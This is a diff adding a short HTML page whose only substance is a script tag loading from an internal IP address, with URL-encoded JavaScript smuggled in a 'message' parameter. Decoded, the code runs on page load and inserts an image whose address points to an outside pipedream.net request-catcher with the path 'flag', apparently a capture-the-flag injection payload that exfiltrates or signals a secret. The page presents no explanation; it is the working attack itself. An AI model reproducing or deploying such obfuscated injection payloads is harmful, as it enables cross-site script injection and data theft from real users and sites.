@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>script</title>
+<script src="http://172.16.0.10/?message=%22use%20strict%22%3B%0Awindow%2EaddEventListener%28%22load%22%2C%20function%28%29%20%7B%0A%09const%20prefix%20%3D%20%22https%3A%2F%2Fxxxxxxxxxxxxx%2Ex%2Epipedream%2Enet%2F%22%3B%0A%09const%20img%20%3D%20document%2EcreateElement%28%22img%22%29%3B%0A%09img%2EsetAttribute%28%22src%22%2C%20prefix%20%2B%20%22flag%22%29%3B%0A%09document%2EgetElementById%28%22thep%22%29%2EappendChild%28img%29%3B%0A%7D%29%3B%0A"></script>
+</head>
+<body>
+<p id="thep">
+hello, world
+</p>
+</body>
+</html>
